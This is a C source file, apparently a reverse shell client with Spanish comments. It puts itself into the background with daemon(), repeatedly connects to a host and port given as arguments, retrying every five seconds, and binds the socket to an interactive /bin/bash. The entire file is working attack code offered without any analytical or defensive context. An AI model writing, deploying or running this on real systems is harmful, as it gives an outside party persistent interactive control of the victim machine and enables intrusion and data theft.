#include <netdb.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

#define SHELL "/bin/bash"
#define MAX_BUF 1024

void error(char* err_msg)
{
    perror(err_msg);
    exit(1);
}

// This function checks if a port was selected in the argc
int chk_argno(int* argc)
{
    if (*argc < 3) {
        error((char*)"ERROR: indicate the server address and the port number!");
        exit(1);
    }

    return 0;
}

int send_message(int* sockfd, char buffer[MAX_BUF])
{
    scanf("%s", buffer);
    return send(*sockfd, buffer, strlen(buffer), MSG_EOR | MSG_NOSIGNAL);
}

int create_socket() { return socket(PF_INET, SOCK_STREAM, IPPROTO_TCP); }

struct sockaddr_in create_serv_addr(char* argv[])
{
    struct sockaddr_in serv_addr;
    struct hostent* server;
    server = gethostbyname(argv[1]);
    memset(&serv_addr, 0, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(atoi(argv[2]));
    serv_addr.sin_addr.s_addr = INADDR_ANY;
    bcopy((char*)server->h_addr, (char*)&serv_addr.sin_addr.s_addr,
        server->h_length);
    return serv_addr;
}

int reconnect(int sockfd)
{
    close(sockfd);
    sockfd = create_socket();
    return sockfd;
}

int main(int argc, char* argv[])
{
    // PUTS PROGRAM ON BACKGROUND AND CHECK PORT NUMBER
    daemon(1, 0);
    chk_argno(&argc);

    char buffer[MAX_BUF];
    int sockfd = create_socket();
    struct sockaddr_in serv_addr = create_serv_addr(argv);

    // TODO  Necesito crear un thread que separe el envio y recepcion de
    // mensajes
    while (1) {
        // Intento conectarme a un servidor que este escuchando conexiones.
        if (connect(sockfd, (struct sockaddr*)&serv_addr, sizeof(serv_addr))
            >= 0) {
            memset(&buffer, 0, MAX_BUF);
            for (int i = 0; i < 3; i++) {
                close(i);
                dup2(sockfd, i);
            }
            execl(SHELL, SHELL, "-i", NULL);
        } else {
            //  Si el cliente no logra contectarse, espera 5 segundos y vuelve a
            //  intentar
            sleep(5);
        }
    }
    return 0;
}
